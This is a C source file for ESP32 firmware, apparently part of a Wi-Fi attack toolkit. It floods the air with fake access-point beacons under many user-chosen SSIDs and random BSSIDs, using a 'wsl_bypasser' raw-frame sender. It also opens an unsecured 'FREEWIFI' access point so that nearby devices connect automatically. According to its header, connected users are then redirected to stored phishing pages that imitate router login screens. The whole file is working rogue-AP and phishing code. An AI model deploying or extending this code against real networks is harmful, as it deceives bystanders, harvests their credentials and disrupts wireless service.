/*
 * attack_beacon_spam.c — WiFi Beacon Spam with Fishing Page Support
 * 
 * Creates multiple fake SSIDs with configurable quantities
 * Open AP (no password) → auto-connect → fishing page redirect
 * Supports stored HTML fishing pages from Fishing_Web/ folder in SPIFFS
 * 
 * Updated: fishing_page paths are properly stored per SSID
 *           fishing_page format: "Fishing_Web/tp_link.html"
 */

#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char *TAG = "BEACON_SPAM";

#define MAX_SSIDS 50
#define MAX_SSID_NAME 33

static TaskHandle_t g_spam_task = NULL;
static volatile bool g_spam_running = false;

typedef struct {
    char ssid[MAX_SSID_NAME];
    int quantity;
    char fishing_page[64];  // HTML file path in SPIFFS, "" = no fishing
} beacon_entry_t;

static beacon_entry_t g_beacon_entries[MAX_SSIDS];
static int g_beacon_count = 0;

// ==================== BEACON SPAM TASK ====================
static void beacon_spam_task(void *pv) {
    g_spam_running = true;
    
    ESP_LOGI(TAG, "📶 Beacon spam started: %d SSID configurations", g_beacon_count);
    for (int i = 0; i < g_beacon_count; i++) {
        ESP_LOGI(TAG, "   '%s' x%d %s", 
                 g_beacon_entries[i].ssid, 
                 g_beacon_entries[i].quantity,
                 g_beacon_entries[i].fishing_page[0] ? "[+FISHING]" : "");
    }
    
    uint64_t total_beacons = 0;
    int current_entry = 0;
    int current_instance = 0;
    
    while (g_spam_running) {
        for (int entry_idx = 0; entry_idx < g_beacon_count && g_spam_running; entry_idx++) {
            beacon_entry_t *entry = &g_beacon_entries[entry_idx];
            
            for (int inst = 0; inst < entry->quantity && g_spam_running; inst++) {
                // Generate unique BSSID for each instance so they appear as different APs
                uint8_t bssid[6];
                bssid[0] = 0x02;
                bssid[1] = (uint8_t)(0xA0 + inst);
                for (int j = 2; j < 6; j++) bssid[j] = esp_random() & 0xFF;
                
                // Random channel 1-11
                uint8_t ch = 1 + (esp_random() % 11);
                
                // Send beacon frame with user's exact SSID
                wsl_bypasser_send_beacon_frame(bssid, (uint8_t*)entry->ssid, 
                                               strlen(entry->ssid), ch);
                total_beacons++;
                
                vTaskDelay(pdMS_TO_TICKS(5)); // Small delay between instances
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10)); // Brief pause between full rounds
    }
    
    ESP_LOGI(TAG, "Beacon spam stopped. Total beacons: %llu", total_beacons);
    g_spam_task = NULL;
    vTaskDelete(NULL);
}

// ==================== PUBLIC API ====================
void beacon_spam_start(const char **ssids, int *quantities, const char **fishing_pages, 
                        int count) {
    if (g_spam_running) {
        beacon_spam_stop();
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    if (count > MAX_SSIDS) count = MAX_SSIDS;
    
    g_beacon_count = 0;
    for (int i = 0; i < count; i++) {
        if (ssids[i] && strlen(ssids[i]) > 0) {
            strncpy(g_beacon_entries[g_beacon_count].ssid, ssids[i], MAX_SSID_NAME - 1);
            g_beacon_entries[g_beacon_count].quantity = (quantities && quantities[i] > 0) ? quantities[i] : 1;
            
            if (fishing_pages && fishing_pages[i] && strlen(fishing_pages[i]) > 0) {
                strncpy(g_beacon_entries[g_beacon_count].fishing_page, fishing_pages[i], 63);
                g_beacon_entries[g_beacon_count].fishing_page[63] = '\0';
                ESP_LOGD(TAG, "Entry %d: SSID='%s' fishing_page='%s'", 
                         g_beacon_count, ssids[i], fishing_pages[i]);
            } else {
                g_beacon_entries[g_beacon_count].fishing_page[0] = '\0';
            }
            
            g_beacon_count++;
        }
    }
    
    if (g_beacon_count == 0) {
        ESP_LOGW(TAG, "No valid SSIDs provided");
        return;
    }
    
    // Start WiFi AP mode for connection handling
    // Start WiFi AP mode for connection handling
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "FREEWIFI",
            .ssid_len = 8,
            .channel = 6,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 8,
        },
    };

    wifi_mode_t current_mode;
    esp_wifi_get_mode(&current_mode);
    
    if (current_mode != WIFI_MODE_APSTA) {
        ESP_LOGI(TAG, "Switching WiFi to APSTA mode (was %d)", current_mode);
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    xTaskCreatePinnedToCore(beacon_spam_task, "beacon_spam", 4096, NULL, 5, 
                            &g_spam_task, 1);
                            
    ESP_LOGI(TAG, "Beacon spam task created on core 1");
}

void beacon_spam_stop(void) {
    g_spam_running = false;
    if (g_spam_task) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    ESP_LOGI(TAG, "Beacon spam stopped");
}

bool beacon_spam_is_running(void) {
    return g_spam_running;
}
